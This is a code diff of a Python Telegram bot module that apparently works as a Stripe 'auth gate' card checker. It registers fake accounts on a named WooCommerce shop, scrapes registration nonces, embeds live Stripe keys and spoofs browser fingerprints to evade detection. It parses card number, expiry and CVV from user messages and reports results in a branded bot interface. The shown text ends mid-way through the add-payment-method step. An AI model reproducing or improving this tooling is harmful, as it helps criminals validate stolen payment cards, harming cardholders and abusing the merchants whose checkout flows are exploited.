@@ -1,17 +1,12 @@
-# BOT/gates/auth/stripe/stauth2.py
-# Stripe Auth 2 Checker - Smart Card Parser with Enhanced UI
-# Compatible with ALL card formats - Intelligent parsing
-# VPS Optimized Version with Connection Stability Fixes
-
+# BOT/gates/auth/stripe/stauth.py
 import json
 import asyncio
 import re
 import time
-import aiohttp
+import httpx
 import random
 import string
 import logging
-import ssl
 from datetime import datetime
 from pyrogram import Client, filters
 from pyrogram.types import Message
@@ -23,7 +18,8 @@ from BOT.helper.start import load_users, save_users
 class EmojiLogger:
     def __init__(self):
         self.logger = logging.getLogger(__name__)
-        self.logger.setLevel(logging.WARNING)
+        self.logger.setLevel(logging.WARNING)  # Only show WARNING and above by default
+        # Prevent propagation to root logger
         self.logger.propagate = False
 
     def info(self, message):
@@ -59,15 +55,13 @@ class EmojiLogger:
     def user(self, message):
         print(f"👤 {message}")
 
-    def parsing(self, message):
-        print(f"🔍 {message}")
-
 # Create global logger instance
 logger = EmojiLogger()
 
 # Suppress other loggers
 logging.getLogger("pyrogram").setLevel(logging.ERROR)
-logging.getLogger("aiohttp").setLevel(logging.ERROR)
+logging.getLogger("httpx").setLevel(logging.ERROR)
+logging.getLogger("httpcore").setLevel(logging.ERROR)
 logging.getLogger("asyncio").setLevel(logging.ERROR)
 
 def load_owner_id():
@@ -93,8 +87,9 @@ def is_user_banned(user_id):
     except:
         return False
 
-def check_cooldown(user_id, command_type="chk"):
+def check_cooldown(user_id, command_type="au"):
     """Check cooldown for user - SKIP FOR OWNER"""
+    # Get owner ID
     owner_id = load_owner_id()
 
     # Skip cooldown check for owner
@@ -130,245 +125,10 @@ def check_cooldown(user_id, command_type="chk"):
 
     return True, 0
 
-# NO CREDIT DEDUCTION FOR ANY USER - This gate is FREE
 # REMOVED: update_user_credits function completely for this command
+# This gate is FREE for all users, no credit deduction
 
-class SmartCardParser:
-    """Intelligent card parser that handles ANY format"""
-
-    @staticmethod
-    def extract_card_from_text(text):
-        """
-        Extract card details from ANY text format.
-        Returns: (cc, month, year, cvv) or (None, None, None, None)
-        """
-        logger.parsing(f"Parsing text: {text[:100]}...")
-
-        # Remove command prefixes if any
-        text = re.sub(r'^/(chk|au|bin|sk|gen|fake|gate)\s*', '', text, flags=re.IGNORECASE)
-        text = re.sub(r'^\.(chk|au|bin|sk|gen|fake|gate)\s*', '', text, flags=re.IGNORECASE)
-        text = re.sub(r'^\$(chk|au|bin|sk|gen|fake|gate)\s*', '', text, flags=re.IGNORECASE)
-
-        # Clean the text
-        text = text.strip()
-
-        # STRATEGY 1: Direct pipe format (most common)
-        # Format: 4355460265778976|01|2028|221 or 4355460265778976|01/2028|221
-        if '|' in text:
-            parts = [p.strip() for p in text.split('|')]
-            if len(parts) >= 1:
-                # Find CC in first part
-                cc_match = re.search(r'(\d{15,19})', parts[0])
-                if cc_match:
-                    cc = cc_match.group(1)
-
-                    # Try to extract month/year/cvv from remaining parts
-                    month, year, cvv = None, None, None
-
-                    if len(parts) >= 2:
-                        # Check if second part has month/year combined
-                        date_part = parts[1]
-                        if '/' in date_part:
-                            date_parts = date_part.split('/')
-                            if len(date_parts) >= 2:
-                                month = date_parts[0].strip()
-                                year = date_parts[1].strip()
-                        else:
-                            month = date_part
-
-                    if len(parts) >= 3:
-                        if year is None:
-                            year = parts[2]
-                        else:
-                            cvv = parts[2]
-
-                    if len(parts) >= 4:
-                        cvv = parts[3]
-
-                    # Try to find CVV in text if not found
-                    if cvv is None:
-                        cvv_match = re.search(r'(\d{3,4})(?:\s|$|/)', text)
-                        if cvv_match:
-                            cvv = cvv_match.group(1)
-
-                    # Validate what we have
-                    if month and year and cvv:
-                        # Clean year
-                        year = re.sub(r'\D', '', year)
-                        if len(year) == 2:
-                            year = '20' + year
-
-                        # Clean month
-                        month = re.sub(r'\D', '', month)
-
-                        # Clean CVV
-                        cvv = re.sub(r'\D', '', cvv)
-
-                        if cc.isdigit() and month.isdigit() and year.isdigit() and cvv.isdigit():
-                            logger.parsing(f"Parsed via pipe format: {cc[:6]}XXXXXX{cc[-4:]}|{month}|{year}|{cvv}")
-                            return cc, month, year, cvv
-
-        # STRATEGY 2: Multi-line format (with address info)
-        lines = [line.strip() for line in text.split('\n') if line.strip()]
-
-        # Look for CC in any line
-        cc = None
-        for line in lines:
-            cc_match = re.search(r'(\d{15,19})', line)
-            if cc_match:
-                cc = cc_match.group(1)
-                break
-
-        if cc:
-            # Look for date in MM/YY or MM/YYYY format
-            month, year = None, None
-            date_patterns = [
-                r'(\d{1,2})[/-](\d{2,4})',  # 01/28 or 01/2028
-                r'(\d{2})(\d{2,4})',        # 0128 or 012028
-            ]
-
-            for line in lines:
-                for pattern in date_patterns:
-                    date_match = re.search(pattern, line)
-                    if date_match:
-                        month = date_match.group(1)
-                        year = date_match.group(2)
-                        if len(year) == 2:
-                            year = '20' + year
-                        break
-                if month and year:
-                    break
-
-            # Look for CVV (3 or 4 digits)
-            cvv = None
-            cvv_patterns = [
-                r'(\d{3,4})(?:\s|$|/)',
-                r'cvv[:\s]*(\d{3,4})',
-                r'cvc[:\s]*(\d{3,4})',
-                r'cid[:\s]*(\d{3,4})',
-            ]
-
-            for line in lines:
-                for pattern in cvv_patterns:
-                    cvv_match = re.search(pattern, line.lower())
-                    if cvv_match:
-                        cvv = cvv_match.group(1)
-                        break
-                if cvv:
-                    break
-
-            # If we found all components
-            if month and year and cvv:
-                month = re.sub(r'\D', '', month)
-                year = re.sub(r'\D', '', year)
-                cvv = re.sub(r'\D', '', cvv)
-
-                if month.isdigit() and year.isdigit() and cvv.isdigit():
-                    logger.parsing(f"Parsed via multiline format: {cc[:6]}XXXXXX{cc[-4:]}|{month}|{year}|{cvv}")
-                    return cc, month, year, cvv
-
-        # STRATEGY 3: Regex search in entire text
-        # Try to find CC + date + CVV patterns
-        combined_patterns = [
-            # Pattern: CC followed by date and CVV
-            r'(\d{15,19})[^\d]*(\d{1,2})[/-]?(\d{2,4})[^\d]*(\d{3,4})',
-            # Pattern: CC, date in next 50 chars, CVV in next 20 chars
-            r'(\d{15,19}).{1,50}?(\d{1,2})[/-]?(\d{2,4}).{1,20}?(\d{3,4})',
-        ]
-
-        for pattern in combined_patterns:
-            match = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
-            if match:
-                cc = match.group(1)
-                month = match.group(2)
-                year = match.group(3)
-                cvv = match.group(4)
-
-                # Clean and validate
-                month = re.sub(r'\D', '', month)
-                year = re.sub(r'\D', '', year)
-                cvv = re.sub(r'\D', '', cvv)
-
-                if len(year) == 2:
-                    year = '20' + year
-
-                if cc.isdigit() and month.isdigit() and year.isdigit() and cvv.isdigit():
-                    logger.parsing(f"Parsed via regex pattern: {cc[:6]}XXXXXX{cc[-4:]}|{month}|{year}|{cvv}")
-                    return cc, month, year, cvv
-
-        # STRATEGY 4: Look for CC and try to infer other details
-        if cc:
-            # Extract month from text (look for 1-12)
-            month_pattern = r'\b(0?[1-9]|1[0-2])\b'
-            month_match = re.search(month_pattern, text)
-            month = month_match.group(1) if month_match else None
-
-            # Extract year (look for 2 or 4 digit years)
-            year_patterns = [
-                r'\b(20\d{2})\b',  # 2024, 2025, etc
-                r'\b(\d{2})(?:\s|$|/)',  # 24, 25, etc
-            ]
-
-            year = None
-            for pattern in year_patterns:
-                year_match = re.search(pattern, text)
-                if year_match:
-                    year = year_match.group(1)
-                    if len(year) == 2:
-                        year = '20' + year
-                    break
-
-            # Extract CVV
-            cvv_pattern = r'\b(\d{3,4})\b'
-            # Try to find CVV that's NOT part of CC or date
-            for match in re.finditer(cvv_pattern, text):
-                cvv_candidate = match.group(1)
-                # Skip if it's part of CC or date
-                if cvv_candidate not in cc and cvv_candidate != month and cvv_candidate != year:
-                    cvv = cvv_candidate
-                    break
-
-            if month and year and cvv:
-                logger.parsing(f"Parsed via inference: {cc[:6]}XXXXXX{cc[-4:]}|{month}|{year}|{cvv}")
-                return cc, month, year, cvv
-
-        logger.warning("Could not parse card details from text")
-        return None, None, None, None
-
-    @staticmethod
-    def validate_card_details(cc, month, year, cvv):
-        """Validate parsed card details"""
-        if not cc or not month or not year or not cvv:
-            return False, "Missing card components"
-
-        # Check CC length
-        if not (15 <= len(cc) <= 19):
-            return False, "Invalid card number length"
-
-        # Check month
-        if not month.isdigit() or not (1 <= int(month) <= 12):
-            return False, "Invalid month (must be 01-12)"
-
-        # Check year
-        if not year.isdigit() or len(year) != 4:
-            return False, "Invalid year (must be 4 digits)"
-
-        # Check if card is expired
-        current_year = datetime.now().year
-        current_month = datetime.now().month
-
-        if int(year) < current_year:
-            return False, "Card expired"
-        elif int(year) == current_year and int(month) < current_month:
-            return False, "Card expired"
-
-        # Check CVV
-        if not cvv.isdigit() or not (3 <= len(cvv) <= 4):
-            return False, "Invalid CVV (must be 3-4 digits)"
-
-        return True, "Valid"
-
-class StripeAuth2Checker:
+class StripeAuthChecker:
     def __init__(self):
         # Modern browser user agents
         self.user_agents = [
@@ -385,8 +145,8 @@ class StripeAuth2Checker:
         self.user_agent = random.choice(self.user_agents)
         self.bin_cache = {}
         self.last_bin_request = 0
-        self.base_url = "https://keysium.com"
-        self.stripe_key = "pk_live_51Kc3g9DdApxJGyJPx748yOELsmezxMjeRKxYUxbHEq0fogP5ZyYwJXhFlsiZLXshhsz7vjJrO08pZSAhcI6zr0w000BjkbpJWO"
+        self.base_url = "https://simonapouchescy.com"
+        self.stripe_key = "pk_live_51I6wp3COExl9jV4CcKbaN3EFxcAB50pTrNUO8OPoGViHyLMPXUBRLDgqu1kYLj1nLkW24fENgejrjKvodrvFaTBY00cQmieKcs"
 
         self.bin_services = [
             {
@@ -408,22 +168,26 @@ class StripeAuth2Checker:
 
     def generate_browser_fingerprint(self):
         """Generate realistic browser fingerprints to bypass detection"""
+        # Screen resolutions
         self.screen_resolutions = [
             "1920x1080", "1366x768", "1536x864", "1440x900", 
             "1280x720", "1600x900", "2560x1440", "3840x2160"
         ]
 
+        # Timezones
         self.timezones = [
             "America/New_York", "America/Chicago", "America/Denver", 
             "America/Los_Angeles", "Europe/London", "Europe/Paris",
             "Asia/Tokyo", "Australia/Sydney"
         ]
 
+        # Languages
         self.languages = [
             "en-US,en;q=0.9", "en-GB,en;q=0.8", "en-CA,en;q=0.9,fr;q=0.8",
             "en-AU,en;q=0.9", "de-DE,de;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8"
         ]
 
+        # Platform
         if "Windows" in self.user_agent:
             self.platform = "Win32"
             self.sec_ch_ua_platform = '"Windows"'
@@ -443,17 +207,58 @@ class StripeAuth2Checker:
             self.platform = "Win32"
             self.sec_ch_ua_platform = '"Windows"'
 
+        # Randomize other fingerprint elements
         self.screen_resolution = random.choice(self.screen_resolutions)
         self.timezone = random.choice(self.timezones)
         self.accept_language = random.choice(self.languages)
+        self.connection_type = random.choice(["keep-alive", "close"])
 
-        # Updated sec-ch-ua to match the trace
-        self.sec_ch_ua = '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"'
+        # Generate Sec-CH-UA headers based on Chrome version
+        chrome_version = re.search(r'Chrome/(\d+)', self.user_agent)
+        if chrome_version:
+            version = chrome_version.group(1)
+            self.sec_ch_ua = f'"Not A;Brand";v="99", "Chromium";v="{version}", "Google Chrome";v="{version}"'
+        else:
+            self.sec_ch_ua = '"Not A;Brand";v="99", "Chromium";v="144", "Google Chrome";v="144"'
 
+        # Generate Sec-CH-UA-Mobile
         self.sec_ch_ua_mobile = "?0" if "Mobile" not in self.user_agent else "?1"
 
+    async def get_country_flag_emoji(self, country_code):
+        """Get proper country flag emoji from antipublic.cc API"""
+        if not country_code or country_code == 'N/A':
+            return '🏳️'
+
+        try:
+            # Use antipublic.cc API to get flag emoji
+            url = f"https://bins.antipublic.cc/bins/000000"
+            async with httpx.AsyncClient(timeout=5.0) as client:
+                response = await client.get(url)
+
+                if response.status_code == 200:
+                    data = response.json()
+
+                    # Try to get flag from response
+                    flag = data.get("country_flag", "")
+                    if flag and flag != "N/A":
+                        return flag
+
+                    # If flag not available, fall back to country code
+                    country = data.get("country_name", "")
+                    if country and country != "N/A":
+                        # Try to extract country code from country name
+                        for code, name in self.country_emojis.items():
+                            if country.lower() in name.lower() or name.lower() in country.lower():
+                                return self.country_emojis.get(code, '🏳️')
+
+        except Exception as e:
+            logger.warning(f"Failed to fetch flag from API: {e}")
+
+        # Fallback to hardcoded emojis
+        return self.get_country_emoji(country_code)
+
     def get_country_emoji(self, country_code):
-        """Get country flag emoji"""
+        """Hardcoded country emoji mapping with more countries"""
         country_emojis = {
             'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
             'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'JP': '🇯🇵', 'CN': '🇨🇳',
@@ -463,17 +268,40 @@ class StripeAuth2Checker:
             'SG': '🇸🇬', 'MY': '🇲🇾', 'TH': '🇹🇭', 'ID': '🇮🇩', 'PH': '🇵🇭',
             'VN': '🇻🇳', 'BD': '🇧🇩', 'PK': '🇵🇰', 'NG': '🇳🇬', 'ZA': '🇿🇦',
             'EG': '🇪🇬', 'MA': '🇲🇦', 'DZ': '🇩🇿', 'TN': '🇹🇳', 'LY': '🇱🇾',
+            'JO': '🇯🇴', 'LB': '🇱🇧', 'KW': '🇰🇼', 'QA': '🇶🇦', 'OM': '🇴🇲',
+            'BH': '🇧🇭', 'IL': '🇮🇱', 'IR': '🇮🇷', 'IQ': '🇮🇷', 'SY': '🇸🇾',
+            'YE': '🇾🇪', 'AF': '🇦🇫', 'LK': '🇱🇰', 'NP': '🇳🇵', 'BT': '🇧🇹',
+            'MM': '🇲🇲', 'KH': '🇰🇭', 'LA': '🇱🇦', 'BN': '🇧🇳', 'TL': '🇹🇱',
+            'PG': '🇵🇬', 'FJ': '🇫🇯', 'SB': '🇸🇧', 'VU': '🇻🇺', 'NC': '🇳🇨',
+            'NZ': '🇳🇿', 'CK': '🇨🇰', 'WS': '🇼🇸', 'TO': '🇹🇴', 'TV': '🇹🇻',
+            'KI': '🇰🇮', 'MH': '🇲🇭', 'FM': '🇫🇲', 'PW': '🇵🇼', 'GU': '🇬🇺',
+            'MP': '🇲🇵', 'PR': '🇵🇷', 'VI': '🇻🇮', 'DO': '🇩🇴', 'HT': '🇭🇹',
+            'JM': '🇯🇲', 'CU': '🇨🇺', 'BS': '🇧🇸', 'BB': '🇧🇧', 'TT': '🇹🇹',
+            'GD': '🇬🇩', 'VC': '🇻🇨', 'LC': '🇱🇨', 'KN': '🇰🇳', 'AG': '🇦🇬',
+            'DM': '🇩🇲', 'MS': '🇲🇸', 'TC': '🇹🇨', 'VG': '🇻🇬', 'AI': '🇦🇮',
+            'BM': '🇧🇲', 'KY': '🇰🇾', 'FK': '🇫🇰', 'GS': '🇬🇸', 'SH': '🇸🇭',
+            'PM': '🇵🇲', 'WF': '🇼🇫', 'TF': '🇹🇫', 'PF': '🇵🇫', 'NC': '🇳🇨',
+            'RE': '🇷🇪', 'YT': '🇾🇹', 'MQ': '🇲🇶', 'GP': '🇬🇵', 'BL': '🇧🇱',
+            'MF': '🇲🇫', 'SX': '🇸🇽', 'CW': '🇨🇼', 'AW': '🇦🇼', 'BQ': '🇧🇶',
+            'SR': '🇸🇷', 'GF': '🇬🇫', 'GY': '🇬🇾', 'VE': '🇻🇪', 'CO': '🇨🇴',
+            'EC': '🇪🇨', 'PE': '🇵🇪', 'BO': '🇧🇴', 'CL': '🇨🇱', 'AR': '🇦🇷',
+            'UY': '🇺🇾', 'PY': '🇵🇾', 'HN': '🇭🇳', 'SV': '🇸🇻', 'NI': '🇳🇮',
+            'CR': '🇨🇷', 'PA': '🇵🇦', 'GT': '🇬🇹', 'BZ': '🇧🇿', 'HN': '🇭🇳',
+            'SV': '🇸🇻', 'NI': '🇳🇮', 'CR': '🇨🇷', 'PA': '🇵🇦', 'GT': '🇬🇹',
+            'BZ': '🇧🇿', 'HN': '🇭🇳', 'SV': '🇸🇻', 'NI': '🇳🇮', 'CR': '🇨🇷',
+            'PA': '🇵🇦', 'GT': '🇬🇹', 'BZ': '🇧🇿'
         }
         return country_emojis.get(country_code.upper() if country_code else 'N/A', '🏳️')
 
     def get_base_headers(self):
-        """Get undetectable base headers matching the trace"""
+        """Get undetectable base headers"""
         return {
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'Accept-Encoding': 'gzip, deflate, br, zstd',
             'Accept-Language': self.accept_language,
             'Cache-Control': 'max-age=0',
-            'DNT': '1',
+            'Connection': self.connection_type,
+            'DNT': '1',  # Do Not Track
             'Sec-CH-UA': self.sec_ch_ua,
             'Sec-CH-UA-Mobile': self.sec_ch_ua_mobile,
             'Sec-CH-UA-Platform': self.sec_ch_ua_platform,
@@ -483,6 +311,8 @@ class StripeAuth2Checker:
             'Sec-Fetch-User': '?1',
             'Upgrade-Insecure-Requests': '1',
             'User-Agent': self.user_agent,
+            'Viewport-Width': self.screen_resolution.split('x')[0],
+            'Width': self.screen_resolution.split('x')[0]
         }
 
     def parse_binlist_net(self, data):
@@ -501,6 +331,7 @@ class StripeAuth2Checker:
 
         brand_display = brand.upper() if brand != 'N/A' else 'N/A'
 
+        # Get flag emoji using improved method
         flag_emoji = self.get_country_emoji(country_code)
 
         return {
@@ -535,8 +366,10 @@ class StripeAuth2Checker:
         if country_name:
             country_name = country_name.replace('(the)', '').strip().upper()
 
+        # If API didn't provide flag, try to get it
         if flag_emoji == '🏳️' or flag_emoji == 'N/A':
             if country_code != 'N/A' and len(country_code) == 2:
+                # Try to get proper flag emoji
                 flag_emoji = self.get_country_emoji(country_code)
 
         return {
@@ -564,9 +397,11 @@ class StripeAuth2Checker:
 
         bin_number = cc[:6]
 
+        # Check cache first
         if bin_number in self.bin_cache:
             return self.bin_cache[bin_number]
 
+        # Rate limiting
         now = time.time()
         if now - self.last_bin_request < 1.0:
             await asyncio.sleep(1.0)
@@ -582,71 +417,65 @@ class StripeAuth2Checker:
             'emoji': '🏳️'
         }
 
-        # Try antipublic.cc first
+        # Try antipublic.cc first (has better flag data)
         try:
             url = f"https://bins.antipublic.cc/bins/{bin_number}"
             headers = {'User-Agent': self.user_agent}
 
-            # Create SSL context that works on VPS
-            ssl_context = ssl.create_default_context()
-            ssl_context.check_hostname = False
-            ssl_context.verify_mode = ssl.CERT_NONE
+            async with httpx.AsyncClient(timeout=10.0) as client:
+                response = await client.get(url, headers=headers)
 
-            connector = aiohttp.TCPConnector(ssl=ssl_context, limit=10)
-            timeout = aiohttp.ClientTimeout(total=15, connect=10, sock_read=15)
-            
-            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-                async with session.get(url, headers=headers, timeout=15) as response:
-                    if response.status == 200:
-                        data = await response.json()
-                        if "detail" in data and "not found" in data["detail"].lower():
-                            logger.warning(f"BIN {bin_number} not found in antipublic.cc")
-                        else:
-                            result = self.parse_antipublic(data)
-                            self.bin_cache[bin_number] = result
-                            return result
+                if response.status_code == 200:
+                    data = response.json()
+
+                    # Check if BIN not found
+                    if "detail" in data and "not found" in data["detail"].lower():
+                        logger.warning(f"BIN {bin_number} not found in antipublic.cc")
+                    else:
+                        # Parse antipublic data with proper flag handling
+                        result = self.parse_antipublic(data)
+                        self.bin_cache[bin_number] = result
+                        return result
         except Exception as e:
             logger.warning(f"antipublic.cc failed: {e}")
 
         # Fallback to binlist.net
-        try:
-            url = f"https://lookup.binlist.net/{bin_number}"
-            headers = {'Accept-Version': '3', 'User-Agent': self.user_agent}
+        for service in self.bin_services:
+            if service['name'] == 'binlist.net':
+                try:
+                    url = service['url'].format(bin=bin_number)
+                    headers = service['headers']
 
-            # Create SSL context that works on VPS
-            ssl_context = ssl.create_default_context()
-            ssl_context.check_hostname = False
-            ssl_context.verify_mode = ssl.CERT_NONE
+                    async with httpx.AsyncClient(timeout=10.0) as client:
+                        response = await client.get(url, headers=headers)
 
-            connector = aiohttp.TCPConnector(ssl=ssl_context, limit=10)
-            timeout = aiohttp.ClientTimeout(total=15, connect=10, sock_read=15)
-            
-            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-                async with session.get(url, headers=headers, timeout=15) as response:
-                    if response.status == 200:
-                        data = await response.json()
-                        result = self.parse_binlist_net(data)
+                        if response.status_code == 200:
+                            data = response.json()
+                            result = service['parser'](data)
 
-                        if result['emoji'] == '🏳️' and result['country_code'] != 'N/A':
-                            better_flag = self.get_country_emoji(result['country_code'])
-                            result['emoji'] = better_flag
+                            # Enhance result with better flag if available
+                            if result['emoji'] == '🏳️' and result['country_code'] != 'N/A':
+                                # Try to get better flag
+                                better_flag = await self.get_country_flag_emoji(result['country_code'])
+                                result['emoji'] = better_flag
 
-                        self.bin_cache[bin_number] = result
-                        return result
-        except Exception as e:
-            logger.warning(f"binlist.net failed: {e}")
+                            self.bin_cache[bin_number] = result
+                            return result
+                except Exception as e:
+                    logger.warning(f"binlist.net failed: {e}")
+                    continue
 
+        # If all fail, return default
         self.bin_cache[bin_number] = default_response
         return default_response
 
     async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info=None):
-        """Format response with same UI as stauth.py"""
         if bin_info is None:
             bin_info = await self.get_bin_info(cc)
 
         user_id = user_data.get("user_id", "Unknown")
         first_name = html.escape(user_data.get("first_name", "User"))
-        badge = user_data.get("plan", {}).get("badge", "🧿")
+        badge = user_data.get("plan", {}).get("badge", "🎭")
 
         if "APPROVED" in status:
             status_emoji = "✅"
@@ -662,10 +491,11 @@ class StripeAuth2Checker:
         user_display = f"「{badge}」{clean_name}"
         bank_info = bin_info['bank'].upper() if bin_info['bank'] != 'N/A' else 'N/A'
 
-        response = f"""<b>「$cmd → /chk」| <b>WAYNE</b> </b>
+        # FIXED: Changed dev link from <a href="https://t.me/D_A_DYY">DADYY</a> to just <b><i>DADYY</i></b>
+        response = f"""<b>「$cmd → /au」| <b>WAYNE</b> </b>
 ━━━━━━━━━━━━━━━
 <b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
-<b>[•] Gateway -</b> Stripe Auth 2
+<b>[•] Gateway -</b> Stripe Auth
 <b>[•] Status-</b> <code>{status_text} {status_emoji}</code>
 <b>[•] Response-</b> <code>{message}</code>
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
@@ -682,251 +512,177 @@ class StripeAuth2Checker:
         return response
 
     def get_processing_message(self, cc, mes, ano, cvv, username, user_plan):
-        return f"""<b>「$cmd → /chk」| <b>WAYNE</b> </b>
+        return f"""<b>「$cmd → /au」| <b>WAYNE</b> </b>
 ━━━━━━━━━━━━━━━
 <b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
-<b>[•] Gateway -</b> Stripe Auth 2
+<b>[•] Gateway -</b> Stripe Auth
 <b>[•] Status-</b> Processing... ⏳
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
 <b>[+] Plan:</b> {user_plan}
 <b>[+] User:</b> @{username}
-━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━
 <b>Checking card... Please wait.</b>"""
 
-    def create_ssl_context(self):
-        """Create SSL context that works on VPS"""
-        ssl_context = ssl.create_default_context()
-        ssl_context.check_hostname = False
-        ssl_context.verify_mode = ssl.CERT_NONE
-        return ssl_context
-
     async def create_authenticated_session(self):
-        """Create authenticated session with aiohttp - VPS OPTIMIZED VERSION"""
-        session = None
-        connector = None
-
+        client = None
         try:
-            # Create SSL context for VPS compatibility
-            ssl_context = self.create_ssl_context()
-
-            # Create connector with VPS-optimized settings
-            connector = aiohttp.TCPConnector(
-                ssl=ssl_context,
-                limit=20,
-                limit_per_host=10,
-                ttl_dns_cache=300,
-                enable_cleanup_closed=True,
-                force_close=False,
-                keepalive_timeout=30
+            # Create client with proper settings
+            client = httpx.AsyncClient(
+                timeout=30.0,
+                follow_redirects=True,
+                limits=httpx.Limits(max_keepalive_connections=5, max_connections=10),
+                http2=True
             )
 
-            # Create session with generous timeouts for VPS
-            timeout = aiohttp.ClientTimeout(
-                total=60,  # Increased from 30
-                connect=20,  # Increased from 10
-                sock_read=40,  # Increased from 20
-                sock_connect=20
-            )
+            # Step 1: Visit homepage
+            logger.step(1, 6, "Getting registration page...")
+            home_response = await client.get(f"{self.base_url}/", headers=self.get_base_headers())
 
-            session = aiohttp.ClientSession(
-                connector=connector,
-                timeout=timeout,
-                headers=self.get_base_headers()
-            )
-
-            # Step 1: Visit homepage to get initial cookies
-            logger.step(1, 6, "Getting homepage...")
-            try:
-                async with session.get(f"{self.base_url}/", timeout=20) as response:
-                    if response.status != 200:
-                        logger.error(f"Homepage failed: {response.status}")
-                        # Try without SSL verification as fallback
-                        if response.status in [403, 502, 503, 504]:
-                            logger.warning("Trying with alternative SSL settings...")
-                            # Recreate session with different settings
-                            await session.close()
-                            await connector.close()
-                            
-                            # Try with more permissive settings
-                            ssl_context = ssl.create_default_context()
-                            ssl_context.check_hostname = False
-                            ssl_context.verify_mode = ssl.CERT_NONE
-                            
-                            connector = aiohttp.TCPConnector(ssl=ssl_context, limit=10)
-                            session = aiohttp.ClientSession(connector=connector, timeout=timeout)
-                            
-                            async with session.get(f"{self.base_url}/", timeout=20) as retry_response:
-                                if retry_response.status != 200:
-                                    logger.error(f"Retry also failed: {retry_response.status}")
-                                    return None, None, f"Failed to access site: {retry_response.status}"
-                                await retry_response.text()
-                        else:
-                            return None, None, f"Failed to access site: {response.status}"
-                    else:
-                        await response.text()
-            except asyncio.TimeoutError:
-                logger.error("Homepage timeout")
-                return None, None, "Connection timeout"
-            except Exception as e:
-                logger.error(f"Homepage error: {str(e)}")
-                return None, None, f"Homepage error: {str(e)}"
+            if home_response.status_code != 200:
+                logger.error(f"Homepage failed: {home_response.status_code}")
+                await client.aclose()
+                return None, None, f"Failed to access site: {home_response.status_code}"
 
             await asyncio.sleep(random.uniform(1.0, 2.0))
 
-            # Step 2: Go to my-account page (registration page)
-            logger.step(2, 6, "Accessing my-account page for registration...")
-            account_url = f"{self.base_url}/my-account/"
+            # Step 2: Go to my-account page
+            logger.step(2, 6, "Registering account...")
+            account_url = f"{self.base_url}/my-account-2/"
 
             headers = self.get_base_headers()
             headers['Referer'] = f"{self.base_url}/"
 
-            try:
-                async with session.get(account_url, headers=headers, timeout=20) as response:
-                    if response.status != 200:
-                        logger.error(f"My-account page failed: {response.status}")
-                        return None, None, f"Failed to access my-account: {response.status}"
+            account_response = await client.get(account_url, headers=headers)
 
-                    account_text = await response.text()
+            if account_response.status_code != 200:
+                logger.error(f"My-account page failed: {account_response.status_code}")
+                await client.aclose()
+                return None, None, f"Failed to access my-account: {account_response.status_code}"
 
-                    # Save response for debugging
-                    try:
-                        with open("debug_account_page.html", "w", encoding="utf-8") as f:
-                            f.write(account_text[:5000])
-                    except:
-                        pass
+            await asyncio.sleep(random.uniform(1.0, 2.0))
 
-                    logger.debug_response(f"Account page length: {len(account_text)} chars")
+            # Extract registration nonce
+            account_text = account_response.text
 
-                    # Step 3: Extract nonce
-                    logger.step(3, 6, "Extracting nonce from page...")
+            # Multiple patterns to find registration nonce
+            patterns = [
+                r'name="woocommerce-register-nonce" value="([a-f0-9]{8,12})"',
+                r'"woocommerce-register-nonce":"([a-f0-9]{8,12})"',
+                r'woocommerce-register-nonce.*?["\']([a-f0-9]{8,12})["\']',
+                r'register_nonce["\']?[^>]*value=["\']([a-f0-9]{8,12})["\']',
+                r'nonce["\']?[^>]*value=["\']([a-f0-9]{8,12})["\']'
+            ]
 
-                    nonce = None
-                    patterns = [
-                        r'name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([a-fA-F0-9]{8,12})["\']',
-                        r'value=["\']([a-fA-F0-9]{8,12})["\'][^>]*name=["\']woocommerce-register-nonce["\']',
-                        r'woocommerce-register-nonce["\']?\s*[:=]\s*["\']([a-fA-F0-9]{8,12})["\']',
-                        r'<input[^>]*name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([^"\']+)["\']',
-                        r'register["\']?[_-]?nonce["\']?\s*[=:]\s*["\']([a-fA-F0-9]{8,12})["\']',
-                    ]
+            reg_nonce = None
+            for pattern in patterns:
+                match = re.search(pattern, account_text, re.IGNORECASE)
+                if match:
+                    reg_nonce = match.group(1)
+                    logger.success(f"Found registration nonce: {reg_nonce}")
+                    break
 
-                    for i, pattern in enumerate(patterns):
-                        match = re.search(pattern, account_text, re.IGNORECASE)
-                        if match:
-                            nonce = match.group(1)
-                            logger.success(f"Found nonce using pattern {i+1}: {nonce}")
-                            break
+            if not reg_nonce:
+                logger.error("Registration nonce not found")
+                await client.aclose()
+                return None, None, "Registration nonce not found"
 
-                    if not nonce:
-                        logger.error("Could not find any nonce on the page")
-                        return None, None, "Could not find registration/login nonce"
+            # Register new user
+            register_success = await self.register_new_user(client, reg_nonce, account_response)
 
-                    # Step 4: Register account
-                    logger.step(4, 6, "Attempting registration...")
-                    register_success = await self.attempt_registration(session, nonce, account_text)
+            if not register_success:
+                logger.error("User registration failed")
+                await client.aclose()
+                return None, None, "Failed to register user"
 
-                    if not register_success:
-                        logger.error("Registration failed")
-                        return None, None, "Registration failed"
+            logger.success("User registration successful")
+            await asyncio.sleep(random.uniform(1.0, 2.0))
 
-                    logger.success("Registration successful")
-                    await asyncio.sleep(random.uniform(2.0, 3.0))
+            # Step 3: Go to add-payment-method page
+            logger.step(3, 6, "Loading payment method page...")
+            payment_url = f"{self.base_url}/my-account-2/add-payment-method/"
 
-                    # Step 5: Go to add-payment-method page
-                    logger.step(5, 6, "Going to add-payment-method page...")
